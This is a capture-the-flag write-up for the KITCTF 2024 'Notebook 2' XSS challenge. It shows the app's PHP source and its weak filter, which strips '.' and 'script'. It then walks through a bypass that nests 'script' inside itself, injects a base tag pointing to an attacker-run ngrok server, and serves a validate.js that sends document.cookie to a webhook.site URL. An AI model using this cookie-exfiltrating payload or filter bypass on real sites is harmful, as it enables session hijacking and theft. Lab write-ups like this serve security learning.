# KITCTF 2024 - Notebook 2 (XSS)

## Description

The Notebook 2
111 points

Unleash the FUTURE of note-taking with our INCREDIBLY MIND-BLOWING app!

Admin: https://the-notebook-2-admin.intro.kitctf.de/
https://the-notebook-2.intro.kitctf.de/ 

## App

![kitctf-2024---notebook-2-xss.png](/assets/ctf/randoms/kitctf-2024---notebook-2-xss.png)

```html
<html lang="en" class=" wcvdaoxonu idc0_350"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>the notebook</title>

    <!-- Some styling -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@1/css/pico.min.css">
    <link rel="stylesheet" href="/static/style.css">

<body style="">
<main class="container">
    <h1>View a note</h1>
    <p>
        1    </p> <!-- 1 is input -->
</main>
<script src="/static/validate.js"></script>
</body></html>
```

In network tab we see:
![xss.png](/assets/ctf/randoms/xss.png)

## Source

```php
<?php
const DATA_DIR = '/tmp/notes';

@mkdir(DATA_DIR);

if (!is_readable(DATA_DIR)) {
    die("Failed to init data dir");
}

function get_path(string $id): string {
    return DATA_DIR . '/' . $id;
}

function xss_filter(string $input): string {
    return str_replace(['.', 'script'], '', $input);
}

<?php
include 'config.php';

if (isset($_POST['note'])) {
    $id = bin2hex(random_bytes(32));
    $data = [
        "note" => $_POST['note'],
        "timestamp" => time(),
    ];

    file_put_contents(get_path($id), xss_filter(json_encode($data)));

    header("Location: /show.php?id=$id");
    die("Redirecting...");
}

include 'partials/head.html';
?>
    <h1>Create a new note</h1>
    <p></p>
    <form method="POST">
        <textarea name="note" data-validate="required"></textarea>
        <input type="submit" value="Create">
    </form>
<?php
include 'partials/footer.html';
function xss_filter(string $input): string {
    return str_replace(['.', 'script'], '', $input);
}
if (isset($_POST['note'])) {
    $id = bin2hex(random_bytes(32));
    $data = [
        "note" => $_POST['note'],
        "timestamp" => time(),
    ];

    file_put_contents(get_path($id), xss_filter(json_encode($data)));

    header("Location: /show.php?id=$id");
    die("Redirecting...");
}
``` 

## Filter Bypass

First of all to bypass `script` just sandwich second script into it and that's it. As for `.` there's no clear way to bypass it. I tried converting domain name to numeric but then it looses SSL/TLS check and cannot be requested. The weird behavior of requesting JavaScript file was odd. I remembered one case where `base` tag was used to change where scripts should be taken from: https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base

`base` tag is exactly for this and can be dangerous. We can request our server and our files, essentially making it RFI and then go bonkers!

## Exploit

Inject `base` tag:
```html
<scrscriptipt>
    const b = document['createElement']('base');
    b['href'] = atob('aHR0cHM6Ly9iNDBhLTIxMi01OC0xMjEtOTUubmdyb2stZnJlZS5hcHA=');
    document['body']['appendChild'](b);
</scrscriptipt>
```

At this point you have to have your server open, I just combined Python's `http.server` + `ngrok` to make my files accessible for application. I 

`/static/validate.js`:
```js
fetch('https://webhook.site/74730694-2b7b-4bf6-ad99-93398c6a38c6?c=' + document.cookie);
```

> Flag: `https://webhook/?c=flag=KCTF{f1lt3rs_c4n_b3_byp4ass3d_1f_br0k3n}`

Your browser may complain that request is invalid, but the bot shouldn't have such  restrictions so just send the url to bot and get flag. 